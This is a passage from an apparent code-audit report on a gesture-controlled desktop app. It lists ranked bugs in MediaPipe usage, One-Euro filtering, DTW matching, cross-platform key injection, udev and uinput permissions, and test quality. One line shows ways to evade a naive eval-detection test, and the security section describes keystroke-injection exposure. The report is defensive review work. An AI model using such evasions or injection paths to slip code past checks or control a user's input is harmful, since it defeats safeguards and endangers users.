**\[P2] No correlation IDs.** A gesture flows through `raw\\\\\\\_landmarks` → `gesture\\\\\\\_triggered` → dispatcher → OS call, but there is no `event\\\\\\\_id` linking them in logs. Debugging "why did my window minimize just now?" is impossible.
**\[P3] `CameraEvent` and `SystemEvent` classes in `data\\\\\\\_types.py` are defined but never published anywhere in the core layer.** Dead observability surface.
#### 4.1.6 Testing gaps
* `test\\\\\\\_engine.py` mocks `LandmarkExtractor`, `start\\\\\\\_camera\\\\\\\_process`, `SharedMemory`, `PluginLoader`, `CustomGestureMatcher` — i.e. **every boundary the engine is supposed to coordinate**. The test verifies that "we called publish() at least once in 50 ms" — it cannot detect the shared-filter bug, the FSM-mutation bug, the race condition, or the missing signal handlers.
* No test for: two hands in one frame, pause/resume, plugin reload, extractor exception, camera process crash, shm corruption, shutdown timeout.
* `test\\\\\\\_state\\\\\\\_machine.py` covers single-FSM transitions, min/max duration, cooldown, abort. It does **not** cover: continuous gesture evaluation, conflict resolution, global cooldown, `reload\\\\\\\_gestures`, malformed conditions, missing target states, chained comparisons, `abs()` calls, threshold shadowing.
* `test\\\\\\\_config\\\\\\\_ast\\\\\\\_safety.py` uses naive substring search (`"eval(" not in content`). It (a) skips the very file that contains `eval()` (`config\\\\\\\_manager.py`), (b) would false-positive on `evaluate(`, `executor(`, etc., (c) cannot detect `getattr(builtins, "ev"+"al")` or `globals()\\\\\\\["eval"]`. Should use `ast.parse` on each `.py` file and walk for `Call` nodes whose `func.id` is `eval`/`exec`.
* No integration test exercises the full `camera → shm → extractor → filter → FSM → dispatcher → controller` path with real (or fake-camera) data.
* No fuzz test for `compile\\\\\\\_condition` with random AST-valid strings.
* No concurrency test for `EventBus` or `GestureFSMManager.reload\\\\\\\_gestures` during `evaluate`.
\---
### 4.2 Vision \& ML Pipeline
**Files:** `gesture\\\\\\\_controller/vision/{camera\\\\\\\_stream,landmark\\\\\\\_extractor,one\\\\\\\_euro\\\\\\\_filter}.py`, `gesture\\\\\\\_controller/models/{dtw\\\\\\\_matcher,feature\\\\\\\_engineering,data\\\\\\\_types}.py`.
#### 4.2.1 Bugs \& correctness
**\[P0] MediaPipe runs in IMAGE mode instead of VIDEO mode.** `landmark\\\\\\\_extractor.py:34` sets `running\\\\\\\_mode=vision.RunningMode.IMAGE` and line 65 calls `self.\\\\\\\_landmarker.detect(mp\\\\\\\_image)`. IMAGE mode re-runs the full BlazePalm detector on every frame, **discarding MediaPipe's tracking state**. The architecture spec §6.2 explicitly shows a per-frame loop expecting tracking. The correct API is `RunningMode.VIDEO` + `detect\\\\\\\_for\\\\\\\_video(mp\\\\\\\_image, timestamp\\\\\\\_ms)`. Real-world impact: 3–5× slower (15–25 ms → 50–80 ms per frame), frequent hand-loss between frames because tracking is unavailable, and the `min\\\\\\\_tracking\\\\\\\_confidence` config knob becomes meaningless.
**\[P0] One-Euro filter params are 250× too small.** `one\\\\\\\_euro\\\\\\\_filter.py:13–14` defaults `min\\\\\\\_cutoff=0.004, beta=0.04`. The One-Euro paper (Casiez 2012) and the MediaPipe sample recommend `min\\\\\\\_cutoff≈1.0, beta≈0.007` for mouse-style input at 60 Hz. With `min\\\\\\\_cutoff=0.004 Hz`, the low-pass time constant τ = 1/(2π·0.004) ≈ **39.8 seconds**. At 30 FPS, α ≈ 0.00083, so the filter moves 0.08% of the way to the new sample per frame. For any real motion (e.g., a 200 ms flick), the filtered output barely moves. **The entire downstream pipeline (features, FSM, DTW) receives landmarks that lag reality by \~1 second.** The unit test `test\\\\\\\_static\\\\\\\_input\\\\\\\_no\\\\\\\_drift` passes trivially because both `landmarks` and `\\\\\\\_x\\\\\\\_filt\\\\\\\_prev` are initialized to the same value — it does not test motion tracking at all.
**\[P0] DTW match fires every frame — action storm.** `CustomGestureMatcher.match()` returns a `GestureEvent` whenever `best\\\\\\\_dist < threshold`. The buffer is a 60-frame rolling window. Once a gesture is performed, the buffer still contains the gesture for \~2 seconds, so `match()` returns the same event **every frame** (30+ times/sec). The engine (engine.py:248–250) calls `match()` every frame the FSM doesn't fire, and publishes the event every time. The architecture spec §7.3 mentions global cooldown, but the engine only applies FSM cooldown — DTW events bypass it. **Result: a single gesture triggers the OS action 60+ times.**
**\[P0] No hand-ID tracking across the entire pipeline.** MediaPipe Tasks returns hands in arbitrary order between frames. With `num\\\\\\\_hands=2`, hand\[0] in frame N may be hand\[1] in frame N+1. The engine (engine.py:217) feeds hand\[0]'s landmarks into the single `OneEuroFilter`, single `CustomGestureMatcher.update\\\\\\\_buffer`, and single FSM manager. **A hand swap mid-gesture corrupts the filter, the DTW buffer, and the FSM state simultaneously.** MediaPipe Tasks exposes `tracking\\\\\\\_id` per hand (in VIDEO mode only — see the IMAGE-mode bug above), but it is ignored here.
**\[P2] `\\\\\\\_capture\\\\\\\_loop` opens `SharedMemory` but `shm.close()` is not in a `try/finally`.** `camera\\\\\\\_stream.py:88–114`. The `raise RuntimeError("Camera frame timeout")` at L99 bypasses `shm.close()`. Every watchdog-triggered reconnect leaks a shm fd; over hours this exhausts descriptors.
**\[P2] `cap.read()` may return a frame with 4 channels (BGRA on some macOS/Windows drivers).** `cv2.cvtColor(frame, cv2.COLOR\\\\\\\_BGR2RGB)` will throw `cv2.error`, the exception is caught by `run()`'s blanket `except Exception`, and the camera reconnects forever — no log entry indicates the channel mismatch.
**\[P2] `cap.set(CAP\\\\\\\_PROP\\\\\\\_FRAME\\\\\\\_WIDTH, …)` return value is never checked.** On many MSMF/V4L2 drivers the request silently fails and the actual capture resolution is e.g. 1280×720, so `np.copyto(frame\\\\\\\_buf, frame)` throws `ValueError: could not broadcast` because the buffers differ in shape.
**\[P2] `min\\\\\\\_hand\\\\\\\_presence\\\\\\\_confidence` config key is mapped to the wrong option.** `landmark\\\\\\\_extractor.py:37` maps `min\\\\\\\_tracking\\\\\\\_confidence` → `min\\\\\\\_hand\\\\\\\_presence\\\\\\\_confidence`. MediaPipe Tasks API has no `min\\\\\\\_tracking\\\\\\\_confidence` (that was the legacy Solutions API). The mapping is semantically wrong and confusing.
**\[P2] `visibility=float(lm.visibility) if hasattr(lm, "visibility") else 1.0` is dead code.** In MediaPipe Tasks `NormalizedLandmark`, `visibility` always exists but is always `0.0` for hand landmarks. Downstream code that reads `visibility` (e.g., for occlusion filtering) will treat every landmark as invisible.
**\[P2] `hand\\\\\\\_type = handedness\\\\\\\[0].category\\\\\\\_name` assumes the `handedness` list is non-empty.** In edge cases (MediaPipe returns landmarks but no handedness) this `IndexError`s and the whole frame is dropped silently or crashes the engine frame loop (depending on which try/except wraps it).
**\[P2] `MODEL\\\\\\\_PATH` only has an `exists()` check, no SHA256 verification.** A tampered or corrupted `.task` file (which is a TFLite flatbuffer) is loaded silently. There is no version pin.
**\[P2] Depth adaptation math is inverted in `one\\\\\\\_euro\\\\\\\_filter.py`.** Lines 58–61: comment says "Far hand (smaller depth metric) -> more smoothing (smaller beta)." Code: `depth\\\\\\\_factor = clip(depth\\\\\\\_metric \\\\\\\* 5, 0.5, 2.0); beta /= depth\\\\\\\_factor`. For a far hand (small `depth\\\\\\\_metric`), `depth\\\\\\\_factor` clamps to 0.5, so `beta /= 0.5 = 2·beta` → **more** responsive (less smoothing), the opposite of the comment.
**\[P2] One-Euro filter has no NaN/Inf handling.** Architecture spec §7.2 explicitly requires: "Filter | NaN in input | Reset filter state, skip frame." The implementation propagates NaN into `\\\\\\\_x\\\\\\\_prev`, `\\\\\\\_dx\\\\\\\_prev`, `\\\\\\\_x\\\\\\\_filt\\\\\\\_prev`, `\\\\\\\_velocity`, `\\\\\\\_acceleration`. Every subsequent frame's output is NaN until the filter is manually `reset()`.
**\[P2] `normalize\\\\\\\_sequence` crashes on empty input** in `dtw\\\\\\\_matcher.py:93–104`: `seq\\\\\\\_arr = np.array(\\\\\\\[])` has shape `(0,)`, then `seq\\\\\\\_arr.shape\\\\\\\[1]` raises `IndexError`.
**\[P2] `load\\\\\\\_templates` silently swallows all load errors** with a `logger.error` but no user-facing signal. A user whose custom gesture failed to load sees the gesture simply not work, with no UI feedback.
**\[P2] 3D Euclidean distance mixes x/y/z scales in `feature\\\\\\\_engineering.py:36–51`.** MediaPipe x,y are normalized to image width/height respectively (different physical scales due to aspect ratio). `np.linalg.norm(centered\\\\\\\[4] - centered\\\\\\\[5])` treats all three axes as equal-scale. On a 640×480 image (4:3), y-distances are 1.33× over-weighted relative to x. All distance-based features (pinch, finger extension, curl) are aspect-ratio-dependent.
**\[P2] `palm\\\\\\\_center = (centered\\\\\\\[0] + centered\\\\\\\[5] + centered\\\\\\\[17]) / 3.0`** in `feature\\\\\\\_engineering.py:98` is different from `Hand.palm\\\\\\\_center` in `data\\\\\\\_types.py:25` which uses **raw** (unnormalized) coords. Two different `palm\\\\\\\_center` fields with the same name and different scales.
**\[P2] `handedness="Right"` hardcoded in returned `FeatureVector`** (feature\_engineering.py:131). The FSM and DTW matcher **cannot distinguish left from right hand gestures**. A "left-hand-only" gesture is impossible.
**\[P2] `app\\\\\\\_profiles` keys are Windows executable names only** (`chrome.exe`, `POWERPNT.EXE`, `vlc.exe`). On macOS/Linux, only `\\\\\\\_default` ever matches. Half-broken feature on the ostensibly primary platform.
**\[P3] `fast\\\\\\\_dtw\\\\\\\_distance` allocates a full `(n+1, m+1)` cost matrix every call.** The gesture\_spec.md §7.3 prescribes a **2-row rolling buffer**. The implementation diverges from the spec. For 60×60 templates that's 30 KB/call vs 1 KB/call.
**\[P3] `@numba.jit(nopython=True)` without `cache=True`.** Every cold start re-compiles (\~2–5 s). The `\\\\\\\_warmup` swallows exceptions, so a numba failure is invisible until the first real `match()` call.
**\[P3] Boundary init uses `1e9` instead of `np.inf`** ("large number instead of inf for Numba compatibility"). Modern numba supports `np.inf` in nopython mode. `1e9` is not actually infinite — for very long templates the accumulated distance can exceed 1e9 and produce wrong min() results.
**\[P3] `CustomGestureMatcher.\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_(self, config: dict | None = None)` accepts `config` but never uses it.** No way to configure threshold, buffer length, or cooldown from YAML.
**\[P3] `self.\\\\\\\_buffer: np.ndarray = np.zeros((60, 63), dtype=np.float64)` — buffer length 60 and feature dim 63 are hardcoded.** Architecture spec §13 says "All thresholds are in YAML config. Zero magic numbers in code." Violation.
**\[P3] `reconnect\\\\\\\_backoff\\\\\\\_ms` default caps growth at 1.6s.** If the camera is permanently gone, the process spin-reconnects forever at 1.6s intervals with no max-retries / give-up logic and no `camera\\\\\\\_disconnected` event published. The EventBus type `CameraEvent.DISCONNECTED` exists but is never published from this module.
**\[P3] No camera-permission pre-check on macOS (TCC) or Windows (capability).** On a fresh install the user sees an infinite reconnect loop with no actionable message.
**\[P3] `time.sleep(0.01)` runs after every iteration of `run()`'s outer while loop, including after a successful capture-loop exit.** Adds 10ms of pointless latency when the camera is reconnecting.
#### 4.2.2 Performance
**\[P0] IMAGE mode (see above) — 3–5× slower inference.** This alone blows the 10 ms MediaPipe budget in architecture spec §5.1.
**\[P2] Three per-frame allocations in `camera\\\\\\\_stream.py:106–109`:** `cv2.resize` (alloc), `cv2.cvtColor` (alloc), `cv2.flip` (alloc). Architecture spec §5.3 explicitly says "Never allocate inside the loop." At 30 FPS this is \~90 allocs/sec of \~920 KB each = 27 MB/s churn.
**\[P2] `template\\\\\\\_arrays` and `threshold\\\\\\\_array` are rebuilt every `match()` call** (dtw\_matcher.py:245–246). With 5 templates of shape (60, 63), that's 5 × 30 KB = 150 KB allocated per frame, 4.5 MB/s at 30 FPS. Should be precomputed in `load\\\\\\\_templates` / `add\\\\\\\_template`.
**\[P2] SharedMemory is created with default permissions.** On Linux this lands in `/dev/shm/psm\\\\\\\_<random>` mode 0644 — any process owned by the same user (or root) can `mmap` it and read raw webcam frames. Should `chmod 600` after creation.
**\[P3] 7 `.copy()` calls per frame on (21,3) arrays in `one\\\\\\\_euro\\\\\\\_filter.py:68, 86–94`.** At 30 FPS × 2 hands = 420 copies/sec. Several copies are redundant: `self.\\\\\\\_velocity = hat\\\\\\\_dx.copy()` then `self.\\\\\\\_dx\\\\\\\_prev = hat\\\\\\\_dx.copy()` — two copies of the same array stored in two fields.
**\[P3] 21 `Landmark3D(x=float(lm.x), …)` dataclass instantiations per hand per frame.** With 2 hands at 30 FPS = 1260 frozen-slots dataclass constructions/sec.
**\[P3] No GPU delegate option.** `BaseOptions` defaults to CPU. On systems with weak CPU and good iGPU (common on ultrabooks), GPU delegate would cut inference time 2–3×. Not configurable.
**\[P3] `time.sleep(0.001)` in engine main loop** wastes 1 ms per frame even when the pipeline is fast. At 2 ms MediaPipe time, this is 33% overhead. Should sleep adaptively based on measured inference time.
#### 4.2.3 ML correctness
* The dominant ML issue is the **multi-hand instability** from no hand-ID tracking (see P0 above).
* **No negative templates.** DTW only matches positive templates; random hand motion will frequently land within `threshold=0.15` of some template, causing false positives. The 60-frame buffer means the matching window is 2 seconds — any 2-second snippet of random motion has a decent chance of matching *something*.
* **Threshold 0.15 is a magic number** with no calibration. No per-user tuning, no per-gesture threshold adaptation, no validation set.
* **No temporal resampling at match time.** If the user records at 30 FPS but runs at 15 FPS (slow machine), the 60-frame buffer covers 4 seconds, while the template covers 2 seconds. DTW handles length differences, but the per-frame Euclidean distance is still computed between mismatched-time frames.
* **No occlusion handling:** if `min\\\\\\\_hand\\\\\\\_presence\\\\\\\_confidence` is not met, the hand disappears from results and the engine resets everything. There's no hysteresis — a single bad frame drops the hand and resets the FSM.
* **No lighting robustness:** no auto-exposure / WB control via `CAP\\\\\\\_PROP\\\\\\\_AUTO\\\\\\\_EXPOSURE`. Low-light frames produce noisy landmarks that the One-Euro filter (with its broken params) over-smooths.
* The spec (`gesture\\\\\\\_spec.md` §2.2–2.3) defines joint angles (e.g., `index\\\\\\\_pip\\\\\\\_angle`) and a richer `FeatureVector` with `palm\\\\\\\_orientation` quaternion and 6 joint angles. **None of these are implemented.** The implementation diverges from the spec significantly. Any FSM condition referencing `index\\\\\\\_pip\\\\\\\_angle` will `AttributeError`.
#### 4.2.4 Observability
* No per-frame inference-time metric.
* No hand-detection-rate metric (hands found / frames processed).
* No confidence histogram logging.
* The `"raw\\\\\\\_landmarks"` event published by the engine (engine.py:204) is the only observability hook, and it publishes the **unfiltered** hands, not the post-filter hands.
* **No DTW distance logging.** Only the winning event is emitted. There's no way to see how close non-matching gestures were, which is essential for threshold tuning.
* **No false-positive rate tracking.**
* **No per-template accuracy metrics.**
* The `confidence = 1.0 - best\\\\\\\_dist` mapping is not a probability; it's an arbitrary monotonic transform. Logged as "confidence" it misleads anyone reading the logs.
#### 4.2.5 Testing gaps
* All tests mock `HandLandmarker.create\\\\\\\_from\\\\\\\_options`. **Zero tests exercise real MediaPipe inference**, so the IMAGE-mode bug is invisible to CI.
* `test\\\\\\\_one\\\\\\\_euro\\\\\\\_filter.py::test\\\\\\\_static\\\\\\\_input\\\\\\\_no\\\\\\\_drift` is a tautology (see P0 above).
* `test\\\\\\\_noisy\\\\\\\_input\\\\\\\_smoothing` doesn't measure signal preservation — a filter that outputs a constant would pass.
* `test\\\\\\\_nan\\\\\\\_input\\\\\\\_recovery` doesn't test recovery, only non-crash.
* No test for the depth-adaptation branch (would have caught the inverted math).
* `test\\\\\\\_dtw\\\\\\\_matcher.py::test\\\\\\\_custom\\\\\\\_gesture\\\\\\\_matcher\\\\\\\_matching` **bypasses `update\\\\\\\_buffer` entirely** — it manually sets `matcher.\\\\\\\_buffer = template\\\\\\\_data.copy()`. The actual buffer-update code path with `to\\\\\\\_hand\\\\\\\_frame` and the flat-concatenation is **never tested**.
* No test for the action-storm bug — there's no test that calls `match()` twice and asserts the second call is suppressed.
* No test for empty/short templates, malformed template JSON, multi-template batch with different shapes.
* No fuzzing of DTW with random sequences.
* All `feature\\\\\\\_engineering` fixtures have `z=0`. **No test exercises 3D geometry**, so the z-scale bug is invisible.
\---
### 4.3 OS Integration Layer
**Files:** `gesture\\\\\\\_controller/os\\\\\\\_integration/{base\\\\\\\_controller,action\\\\\\\_dispatcher,linux\\\\\\\_wayland\\\\\\\_controller,macos\\\\\\\_controller,windows\\\\\\\_controller}.py`, `packaging/99-gesture-controller-uinput.rules`.
#### 4.3.1 Bugs \& correctness
**\[P0] Cross-platform key-name vocabulary is broken.** The default profile (`predefined\\\\\\\_gestures.yaml:104-106`) defines:
```yaml
\\\\\\\_default:
  SwipeLeft: "KeyPress:ArrowLeft"
  SwipeRight: "KeyPress:ArrowRight"
```
|Key string|Linux (`LINUX\\\\\\\_KEYCODES`)|macOS (`MAC\\\\\\\_KEYCODES`)|Windows (pyautogui)|
|-|-|-|-|
|`ArrowLeft`|❌ silently dropped|❌ silently dropped|❌ `ValueError: Key name must be valid`|
|`ArrowRight`|❌ same|❌ same|❌ same|
|`Ctrl+Shift+Tab`|✓|✓|✓|
|`Super+D`|✓|❌ ("super" not in modifier list)|❌ ("super" not known to pyautogui)|
|`Win+D`|❌|❌|✓|
|`Cmd+M`|❌|❌ **sends Cmd+A**|❌|
The dispatcher does **no normalization**. Each controller does its own `.lower()` but the keycode maps use different vocabularies. **The default configuration is broken on every platform**, and Windows additionally crashes the engine thread on unknown key names.
**\[P0] macOS `cmd+m` minimize fallback sends `cmd+a` (Select All).** `MAC\\\\\\\_KEYCODES` (lines 28-35) is missing `m`, `n`, `o`, `p`, `i`, `j`, `k`, `l`, `u` and all digits/symbols. The minimize fallback `self.key\\\\\\\_combo(\\\\\\\["cmd", "m"])` (line 234) resolves `MAC\\\\\\\_KEYCODES.get("m", 0)` → `0` → which is the keycode for **"a"**. So the fallback for minimize sends **Cmd+A (Select All)** instead of Cmd+M (Minimize). This fires whenever the Accessibility API fails — the common case on a fresh install without permissions.
**\[P0] Linux X11 minimize is broken (`$(...)` not expanded with `shell=True` + list).** `linux\\\\\\\_wayland\\\\\\\_controller.py:319-320`:
```python
subprocess.run(\\\\\\\["xdotool", "windowminimize", "$(xdotool getactivewindow)"], shell=True, capture\\\\\\\_output=True)
```
With `shell=True` and a list, the first list element is the command string and the rest become `$0, $1, …` to `/bin/sh`. The `$(…)` is **never expanded**. The actual command run is `xdotool` with no args, which prints usage to stderr and returns non-zero. Minimize on X11 is completely broken.
**\[P0] Linux GNOME/KDE minimize triggers "Show Desktop" instead of minimize.** `linux\\\\\\\_wayland\\\\\\\_controller.py:310-323` falls back to `self.key\\\\\\\_combo(\\\\\\\["super", "d"])` for GNOME/KDE. `Super+D` is Show Desktop on most DEs, **not Minimize**. GNOME's minimize shortcut is `Super+H`; KDE's is `Meta+Down`. Combined with the xdotool bug above, minimize is broken on **every** Linux DE: GNOME/KDE get Show Desktop, X11 gets a no-op, and only sway/hyprland work (via scratchpad, which is semantically different from minimize).
**\[P0] `\\\\\\\_create\\\\\\\_uinput\\\\\\\_device` struct pack is malformed.** `linux\\\\\\\_wayland\\\\\\\_controller.py:94`:
```python
struct\\\\\\\_uinput = struct.pack("80sHHiH", device\\\\\\\_name, BUS\\\\\\\_USB, 0x1234, 0x5678, 0x0001)
```
The kernel `struct uinput\\\\\\\_user\\\\\\\_dev` is `{char name\\\\\\\[80]; struct input\\\\\\\_id id; \\\\\\\_\\\\\\\_s32 ff\\\\\\\_effects\\\\\\\_max;}` where `input\\\\\\\_id = {\\\\\\\_\\\\\\\_u16 bustype, vendor, product, version}`. The correct format is `"80sHHHHi"` (80 + 2+2+2+2 + 4 = 92 bytes). The code's `"80sHHiH"` is 90 bytes and **encodes `product` as a 4-byte int** (`0x5678`), which overflows into `version` and writes `0x0001` into the first 2 bytes of `ff\\\\\\\_effects\\\\\\\_max`.
**\[P0] `pyautogui.FAILSAFE = True` (windows\_controller.py:12) is a global, process-wide setting.** The failsafe triggers `pyautogui.FailSafeException` if the mouse cursor hits the top-left corner (0,0). For a **gesture-driven** mouse controller, the user may legitimately move the mouse to (0,0) via a gesture, causing an unhandled exception that crashes the dispatcher.
**\[P1] `pyautogui.PAUSE = 0.01` adds 10 ms latency to every pyautogui call.** `pyautogui.hotkey("ctrl", "shift", "c")` makes 6 internal calls (3 keyDown + 3 keyUp) = **60 ms minimum** per key combo. For a 30 FPS gesture pipeline, this consumes 2 frames per action.
**\[P1] `key\\\\\\\_press` only emits key-down on Linux/macOS.** Modifier keys are pressed down but never released. Repeated `key\\\\\\\_press("a", modifiers=\\\\\\\["ctrl"])` calls accumulate stuck modifiers until the OS auto-repeats them into other apps. macOS has the same issue (lines 62-70) and additionally posts `key\\\\\\\_release` with `flags=0`, which can leave the OS thinking the modifier is still down.
**\[P1] No Accessibility permission check on macOS.** `\\\\\\\_\\\\\\\_init\\\\\\\_\\\\\\\_` does nothing. `minimize\\\\\\\_active\\\\\\\_window` calls `AXUIElementCopyAttributeValue` which **silently returns an error code** if the process is not trusted (`AXIsProcessTrusted()` is False). The code checks `if err == 0 and window:` and falls through to the broken `cmd+m` fallback (which sends `cmd+a`). The user is never prompted to grant Accessibility permission.
**\[P1] `\\\\\\\_emit\\\\\\\_event` can raise `BlockingIOError`** (linux\_wayland\_controller.py:104-112). The fd is opened `O\\\\\\\_NONBLOCK`. If the kernel event queue is full, `os.write` raises. No retry, no fallback. The exception is swallowed by the event bus's catch-all. The gesture silently fails.
**\[P1] `\\\\\\\_create\\\\\\\_uinput\\\\\\\_device` leaks the fd on partial failure.** If `os.open` succeeds but a later `fcntl.ioctl` raises, the fd is never closed.
**\[P1] `LINUX\\\\\\\_KEYCODES` is missing most keys** (lines 24-33). No digits (0-9), no symbols, no `backspace`, `home`, `end`, `pageup`, `pagedown`, `insert`, `capslock`. The default profile action `KeyPress:ArrowLeft` produces `LINUX\\\\\\\_KEYCODES.get("arrowleft", 0)` → `0` → silently dropped.
**\[P1] `mouse\\\\\\\_move` with `absolute=True` is a silent no-op on uinput** (lines 227-239). Absolute positioning requires `EV\\\\\\\_ABS` + `ABS\\\\\\\_MT\\\\\\\_POSITION\\\\\\\_X/Y`, which is never set up in `\\\\\\\_create\\\\\\\_uinput\\\\\\\_device`.
**\[P1] Middle mouse button: `mouse\\\\\\\_click("middle")` → `BTN\\\\\\\_RIGHT`** (line 200). **Wrong**: should be `BTN\\\\\\\_MIDDLE` (0x112).
**\[P1] `mouse\\\\\\\_double\\\\\\\_click` on uinput emits four raw events with no `SYN\\\\\\\_REPORT` between the two clicks.** Some compositors interpret this as a single click with bounce, not a double-click.
**\[P1] Volume step inconsistency.** uinput sends one `KEY\\\\\\\_VOLUMEUP` event. Windows sends **three** `volumeup` presses. Cross-platform parity bug.
**\[P1] `get\\\\\\\_foreground\\\\\\\_app` is called synchronously on every gesture event.** On Linux/sway this spawns `swaymsg -t get\\\\\\\_tree` and JSON-parses the entire window tree (10–50 ms). On Linux/X11 it spawns **two** `xdotool` subprocesses (20–40 ms). No caching, no timeout.
**\[P1] `get\\\\\\\_foreground\\\\\\\_app` on macOS returns `localizedName()`** (e.g., "Google Chrome"). But the profile keys are `"chrome.exe"` — Windows process names. **No macOS profile will ever match.** The entire app-profile feature is dead on macOS.
**\[P1] `show\\\\\\\_desktop` on macOS sends F11.** On macOS, F11 is Mission Control by default; "Show Desktop" is `Fn+F11` or a trackpad gesture.
**\[P1] `windows\\\\\\\_controller.py` `get\\\\\\\_foreground\\\\\\\_app` exception handler is over-broad** (line 79): `except (psutil.NoSuchProcess, psutil.AccessDenied, Exception):`. `Exception` makes the preceding two redundant and swallows `MemoryError`, `ImportError`, etc.
**\[P1] `mouse\\\\\\\_double\\\\\\\_click` ignores the `x, y` parameters when they're `None`** (windows\_controller.py:46): `pyautogui.doubleClick(x, y, button=button)` raises `TypeError` if `x` or `y` is `None`. Should be `pyautogui.doubleClick(button=button)` when coords are None.
**\[P2] `action\\\\\\\_dispatcher.py:49` uses two-level dict access** (`config.get("profiles", {}).get("auto\\\\\\\_detect\\\\\\\_app", True)`) while every other call site uses dot-notation. The mock papers over this; against a real `ConfigManager` the access pattern is wrong.
**\[P2] `keys = keys\\\\\\\_str.split("+")` — no `.strip()`, no case normalization** (action\_dispatcher.py:102). A plugin YAML with `"KeyPress:Ctrl + Shift + Tab"` (spaces) produces `\\\\\\\["Ctrl ", " Shift ", " Tab"]`, none of which match any keycode map.
**\[P2] `mouse\\\\\\\_click(button=button.lower())` only honors "left" and "right" on Linux.** Middle-click and any other button silently become right-click.
**\[P2] `\\\\\\\_execute` has no `try/except`.** If `key\\\\\\\_combo` raises (e.g. pyautogui `ValueError` on Windows for an unknown key name), the exception propagates to `EventBus.publish`, which catches it per-handler and **logs but does not surface** the failure. The user sees no error; the gesture just stops working.
**\[P2] `\\\\\\\_detect\\\\\\\_window\\\\\\\_manager` misdetects GNOME.** `shutil.which("gnome-shell")` returns a path on any system with gnome-shell installed, even if the user is in KDE/XFCE.
**\[P2] `\\\\\\\_post\\\\\\\_media\\\\\\\_key` data1 encoding is incomplete on macOS** (lines 248-249). The standard `NX\\\\\\\_KEYTYPE` encoding for `NSSystemDefined` events also sets bit 8 of the subtype and includes a `pressed` flag. The current encoding works for some keys on some macOS versions but is unreliable on Sonoma+.
**\[P2] `mouse\\\\\\\_scroll` on macOS overwrites delta\_y with delta\_x.** `Quartz.CGEventCreateScrollWheelEvent(None, 0, 2, 0, delta\\\\\\\_x)` — the second axis delta is `delta\\\\\\\_x`, but the first axis (delta\_y) is hardcoded to `0`. Diagonal scroll is broken.
**\[P3] UIPI (User Interface Privilege Isolation) is not handled on Windows.** If the user runs Maestro as a standard user and tries to send input to an elevated process (Task Manager, Registry Editor, installers), `SendInput` silently fails. No detection, no warning.
**\[P3] `struct.pack("llHHI", …)` hardcodes native `long` size.** On 64-bit Linux `long` is 8 bytes → 24-byte `input\\\\\\\_event` (correct). On 32-bit ARM Linux `long` is 4 bytes → 16-byte `input\\\\\\\_event` (also correct). But the format relies on native alignment padding; if a future refactor adds a `<` or `>` prefix, it silently breaks.
#### 4.3.2 Security
**\[P0] udev rule grants broad `input` group write access to `/dev/uinput`.** `packaging/99-gesture-controller-uinput.rules`:
```
KERNEL=="uinput", MODE="0660", GROUP="input", OPTIONS+="static\\\\\\\_node=uinput"
```
Any process running as a user in the `input` group can create **virtual keyboards and mice** — a well-known malware persistence vector on Linux. There is no AppArmor/SELinux profile, no capability bounding, and **no documentation** that the user must be added to the `input` group. The rule does not include a `TAG+="uaccess"` or systemd seat-based alternative. There is **no install script** that reloads udev rules or adds the user to the group.
**\[P1] No `AXIsProcessTrustedWithOptions` prompt on macOS.** The first time the user runs the app, gestures silently fail. The user has to discover the Accessibility permission requirement on their own.
**\[P1] `CGEventPost(kCGHIDEventTap, …)` posts at the HID event tap, which bypasses most app-level input filtering.** This is the correct API for accessibility tools, but it also means a compromised Maestro process can inject keystrokes into password fields, Keychain prompts, and Screen Lock. There is no audit logging of injected events.
**\[P2] The controller opens `/dev/uinput` with no uid/gid check.** If the user is not in the `input` group, `os.open` raises `PermissionError` and the controller silently falls back to xdotool — which **does not work on Wayland**. The user has zero feedback that gestures are dead.
**\[P2] `subprocess.run(\\\\\\\["xdotool", …], capture\\\\\\\_output=True)` swallows stdout/stderr.** If xdotool fails (e.g., DISPLAY not set, or Wayland session with no xdotool), the error is invisible.
#### 4.3.3 Cross-platform parity
The feature matrix below shows what works on each platform today. ✓ = works, ✗ = broken/silent no-op, ⚠ = partial/wrong.
|Action|Linux/Wayland (uinput)|Linux/X11 (xdotool)|macOS (Quartz)|Windows (pyautogui)|
|-|-|-|-|-|
|`KeyPress:<letter>`|⚠ (only keys in `LINUX\\\\\\\_KEYCODES`)|⚠|⚠ (only keys in `MAC\\\\\\\_KEYCODES`)|✓|
|`KeyPress:ArrowLeft` (default)|✗ silently dropped|✗|✗|✗ ValueError|
|`KeyPress:Ctrl+Shift+Tab`|✓|✓|✓|✓|
|`MouseClick:left`|✓|✓|✓|✓|
|`MouseClick:middle`|✗ (sends right)|✗|⚠|⚠|
|`MouseClick:right`|✓|✓|✓|✓|
|`MouseScroll:delta`|✓|⚠|⚠ (diagonal broken)|⚠|
|`MouseScroll:<int>`|✓|✓|✓|✓|
|`MouseMove:absolute`|✗ (silent no-op on uinput)|✓|✓|✓|
|`MouseMove:relative`|✓|✓|✓|✓|
|`MinimizeWindow`|⚠ (scratchpad on wlr)|✗ (`$(...)` bug)|✗ (sends Cmd+A)|✓|
|`ShowDesktop`|⚠ (Super+D)|⚠|✗ (F11 = Mission Control)|✓|
|`SwitchWindow`|⚠ (super+tab)|⚠|⚠ (App Switcher stays open)|✓|
|`VolumeUp/Down`|⚠ (1 step)|⚠|⚠ (1 step)|⚠ (3 steps)|
|`MediaPlay/Pause`|⚠|⚠|⚠ (unreliable on Sonoma)|✓|
|App-profile matching|✗ (Linux process names)|✗|✗ (returns localized name)|✓ (Windows .exe names)|
#### 4.3.4 Observability
* **No structured action-dispatch logging.** `ActionDispatcher.\\\\\\\_on\\\\\\\_gesture` logs `gesture`, `action`, `app` but not: the foreground process queried, the profile matched, the dispatch latency, the controller method called, or whether the method raised.
* **No plugin crash isolation metrics.** The event bus catches exceptions per-handler and logs them, but there's no counter, no alerting, no circuit-breaker. A plugin that crashes on every gesture event logs 60 stack traces per second with no backoff.
* **No diagnostic dump.** There's no "Export Diagnostics" action in the tray menu.
#### 4.3.5 Testing gaps
* `test\\\\\\\_macos\\\\\\\_controller.py:93`: `mock\\\\\\\_quartz.CGEventPost.call\\\\\\\_count == 2` — this is a **comparison expression, not an assertion**. The test passes regardless of `call\\\\\\\_count`. Should be `assert mock\\\\\\\_quartz.CGEventPost.call\\\\\\\_count == 2`.
* `test\\\\\\\_linux\\\\\\\_controller.py:232-240`: `test\\\\\\\_linux\\\\\\\_window\\\\\\\_manager\\\\\\\_actions` has comments `# verify alt+tab triggered` and `# verify super+d triggered` but **no assertions at all**. The test passes trivially.
